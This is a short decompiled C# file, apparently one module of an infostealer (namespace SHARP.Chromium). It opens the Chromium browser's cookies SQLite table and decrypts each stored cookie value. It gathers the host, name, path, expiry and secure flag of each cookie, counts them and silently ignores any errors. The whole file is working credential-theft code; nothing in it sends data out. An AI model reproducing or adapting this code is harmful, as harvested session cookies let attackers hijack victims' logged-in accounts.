﻿using System;
using System.Collections.Generic;

namespace SHARP.Chromium
{
	// Token: 0x02000081 RID: 129
	internal sealed class Cookies
	{
		// Token: 0x060002BA RID: 698 RVA: 0x00010C0C File Offset: 0x0000EE0C
		public static List<Cookie> Get(string sCookie)
		{
			List<Cookie> list = new List<Cookie>();
			try
			{
				SQLite sqlite = SqlReader.ReadTable(sCookie, "cookies");
				if (sqlite == null)
				{
					return list;
				}
				for (int i = 0; i < sqlite.GetRowCount(); i++)
				{
					Cookie item = default(Cookie);
					item.sValue = Crypto.EasyDecrypt(sCookie, sqlite.GetValue(i, 12));
					if (item.sValue == "")
					{
						item.sValue = sqlite.GetValue(i, 3);
					}
					item.sHostKey = Crypto.GetUTF8(sqlite.GetValue(i, 1));
					item.sName = Crypto.GetUTF8(sqlite.GetValue(i, 2));
					item.sPath = Crypto.GetUTF8(sqlite.GetValue(i, 4));
					item.sExpiresUtc = Crypto.GetUTF8(Crypto.GetUTF16(sqlite.GetValue(i, 5)));
					item.sIsSecure = Crypto.GetUTF8(sqlite.GetValue(i, 6).ToUpper());
					Counting.Cookies++;
					list.Add(item);
				}
			}
			catch
			{
			}
			return list;
		}
	}
}
